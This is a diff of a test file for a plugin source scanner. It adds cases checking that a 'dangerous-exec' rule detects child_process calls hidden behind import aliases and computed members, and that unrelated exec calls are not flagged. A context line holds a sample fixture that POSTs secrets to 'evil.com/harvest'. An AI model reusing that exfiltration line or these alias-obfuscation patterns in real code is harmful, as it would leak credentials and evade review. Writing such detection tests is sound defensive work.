@@ -283,6 +283,38 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `,
       expected: { ruleId: "env-harvesting", severity: "critical" as const },
     },
+    {
+      name: "detects child_process call through an ESM import alias",
+      source: `
+import { spawn as launch } from "node:child_process";
+launch("node", ["server.js"]);
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process call through a CJS destructured alias",
+      source: `
+const { exec: run } = require("child_process");
+run("node server.js");
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process call through a computed member",
+      source: `
+import cp from "node:child_process";
+cp["spawn"]("node", ["server.js"]);
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process computed exec through a namespace alias",
+      source: `
+const proc = require("child_process");
+proc["exec"]("node server.js");
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
   ] as const;
 
   it("detects suspicious source patterns", () => {
@@ -310,6 +342,33 @@ const options: ExecOptions = {};
 const match = /^keychain:(.+)$/.exec(value);
 `;
     const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "dangerous-exec", false);
+  });
+
+  it("does not flag an alias call when the alias is not from child_process", () => {
+    // The source-wide child_process gate passes (a type import), and the alias
+    // name `launch` matches the call site — but the alias was bound from a
+    // different module, so provenance scoping must suppress the finding.
+    const source = `
+import type { ExecOptions } from "child_process";
+import { spawn as launch } from "./other-module";
+launch("node", ["server.js"]);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "dangerous-exec", false);
+  });
+
+  it("does not flag a computed exec-style call on a non-child_process object", () => {
+    // A regex receiver is not a child_process namespace alias, so the computed
+    // ["exec"] call stays benign — preserving the RegExp.exec exclusion.
+    const source = `
+import { exec } from "child_process";
+const re = /pattern/;
+re["exec"](value);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    // The bare `exec` import-without-call must not by itself produce a finding,
+    // and the computed `re["exec"]()` must remain suppressed.
     expectRulePresence(findings, "dangerous-exec", false);
   });
 
